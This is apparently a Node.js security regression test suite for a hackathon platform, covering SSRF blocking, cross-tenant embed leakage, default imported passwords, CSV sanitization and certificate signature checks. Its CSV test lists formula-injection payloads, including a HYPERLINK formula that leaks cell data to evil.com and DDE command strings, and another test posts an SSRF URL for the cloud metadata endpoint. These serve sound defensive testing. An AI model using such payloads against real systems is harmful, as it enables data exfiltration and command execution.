const { test, describe, before, after } = require('node:test');
const assert = require('node:assert/strict');
const bcrypt = require('../../backend/node_modules/bcryptjs');
const prisma = require('../../backend/src/utils/prisma');
const { startTestServer, stopTestServer, request, login } = require('../testHelper');
const { sanitizeCsvCell } = require('../../backend/src/utils/csv');

describe('Phase 24: Security Regression Test Suite', () => {
  let organizerToken;
  let eventA;
  let eventB;

  before(async () => {
    await startTestServer();
    organizerToken = await login('organizer@hack.com');

    eventA = await prisma.event.create({
      data: {
        title: 'Security Event Alpha',
        description: 'Public hackathon for security regressions',
        startDate: new Date(),
        deadline: new Date(Date.now() + 86400000),
        status: 'PUBLISHED',
        organizer: { connect: { email: 'organizer@hack.com' } },
      },
    });

    eventB = await prisma.event.create({
      data: {
        title: 'Security Event Beta (Draft/Private)',
        description: 'Private draft hackathon',
        startDate: new Date(),
        deadline: new Date(Date.now() + 86400000),
        status: 'DRAFT',
        organizer: { connect: { email: 'organizer@hack.com' } },
      },
    });
  });

  after(async () => {
    if (eventA || eventB) {
      await prisma.submission.deleteMany({ where: { eventId: { in: [eventA.id, eventB.id] } } });
      await prisma.team.deleteMany({ where: { eventId: { in: [eventA.id, eventB.id] } } });
      await prisma.webhookDelivery.deleteMany({ where: { eventId: { in: [eventA.id, eventB.id] } } });
      await prisma.webhook.deleteMany({ where: { eventId: { in: [eventA.id, eventB.id] } } });
      await prisma.certificate.deleteMany({ where: { eventId: { in: [eventA.id, eventB.id] } } });
      await prisma.event.deleteMany({ where: { id: { in: [eventA.id, eventB.id] } } });
    }
    await stopTestServer();
  });

  test('Attack Path 1: SSRF via Cloud Metadata (169.254.169.254) must be blocked', async () => {
    const res = await request(`/webhooks/${eventA.id}`, {
      method: 'POST',
      headers: { Authorization: `Bearer ${organizerToken}` },
      body: {
        url: 'http://169.254.169.254/latest/meta-data',
        events: ['submission.created'],
      },
    });

    assert.strictEqual(res.status, 400);
    assert.strictEqual(res.body.success, false);
    const message = (res.body.error || res.body.message || '').toLowerCase();
    assert.strictEqual(
      message.includes('ssrf') ||
        message.includes('private') ||
        message.includes('invalid') ||
        message.includes('metadata'),
      true
    );
  });

  test('Attack Path 2: Cross-Tenant Embed Fallback & Private Event Leakage blocked', async () => {
    // 1. Non-existent event must return 404, never fallback to event #1
    const invalidRes = await request('/embed/gallery/99999999');
    assert.strictEqual(invalidRes.status, 404);

    // 2. Draft/Private event cannot be embedded publicly
    const draftRes = await request(`/embed/gallery/${eventB.id}`);
    assert.strictEqual(draftRes.status, 404);

    // 3. Data DTO for draft event must also be blocked
    const draftDataRes = await request(`/embed/gallery/${eventB.id}/data`);
    assert.strictEqual(draftDataRes.status, 404);
  });

  test('Attack Path 3: Weak Imported Account Takeover (password123) is eliminated', async () => {
    const importedEmail = `imported-victim-${Date.now()}@example.com`;
    const importRes = await request(`/bulk/${eventA.id}/import`, {
      method: 'POST',
      headers: { Authorization: `Bearer ${organizerToken}` },
      body: {
        projects: [
          {
            title: 'Hacked Submission',
            teamName: 'Victim Team',
            submitterEmail: importedEmail,
            submitterName: 'Victim User',
          },
        ],
      },
    });

    assert.strictEqual(importRes.status, 201);

    // Verify imported user was created
    const createdUser = await prisma.user.findUnique({ where: { email: importedEmail } });
    assert.ok(createdUser, 'Imported user should exist in database');

    // Attempt login with default hardcoded password 'password123'
    const loginRes = await request('/auth/login', {
      method: 'POST',
      body: {
        email: importedEmail,
        password: 'password123',
      },
    });

    // Login MUST fail (401 or 400)
    assert.notStrictEqual(loginRes.status, 200, 'Login with password123 must NOT succeed');

    // Verify hash is not a hash of 'password123'
    const isDefaultPw = await bcrypt.compare('password123', createdUser.passwordHash);
    assert.strictEqual(isDefaultPw, false, 'Database hash must never match password123');

    // Cleanup
    await prisma.teamMember.deleteMany({ where: { userId: createdUser.id } });
    await prisma.user.delete({ where: { id: createdUser.id } }).catch(() => {});
  });

  test('Attack Path 4: CSV Formula Injection (=, +, -, @, TAB, CR) must be neutralized', () => {
    const maliciousPayloads = [
      '=HYPERLINK("http://evil.com/leak?d="&A1, "Click Here")',
      '+cmd|\' /C calc\'!A0',
      '-2+3+cmd',
      '@SUM(1+1)*cmd',
      '\t=cmd|',
      '\r=cmd|',
    ];

    for (const payload of maliciousPayloads) {
      const sanitized = sanitizeCsvCell(payload);
      assert.strictEqual(
        sanitized.startsWith("'"),
        true,
        `Payload "${payload}" must be escaped with a leading single quote`
      );
    }
  });

  test('Attack Path 5: Certificate & Judge Record Forgery detected by Ed25519 verification', async () => {
    // 1. Issue authentic certificate
    const issueRes = await request(`/certificates/${eventA.id}/issue`, {
      method: 'POST',
      headers: { Authorization: `Bearer ${organizerToken}` },
      body: {
        role: 'WINNER',
        recipientName: 'Alice Authentic',
        recipientEmail: 'alice@example.com',
      },
    });

    assert.strictEqual(issueRes.status, 201);
    const cert = issueRes.body.data;
    assert.ok(cert.signature);
    assert.ok(cert.keyId);

    // 2. Verify authentic certificate passes
    const authVerifyRes = await request(`/certificates/verify/${cert.id}`);
    assert.strictEqual(authVerifyRes.status, 200);
    assert.strictEqual(authVerifyRes.body.data.isValid, true);

    // 3. Forgery Attempt: Tamper with recipient in database (e.g. Malicious Actor changed recipient)
    await prisma.certificate.update({
      where: { id: cert.id },
      data: { recipientName: 'Eve Forger' },
    });

    // Verification must fail!
    const tamperedVerifyRes = await request(`/certificates/verify/${cert.id}`);
    assert.strictEqual(tamperedVerifyRes.status, 200);
    assert.strictEqual(
      tamperedVerifyRes.body.data.isValid,
      false,
      'Tampered recipient name must fail cryptographic signature verification'
    );
  });
});
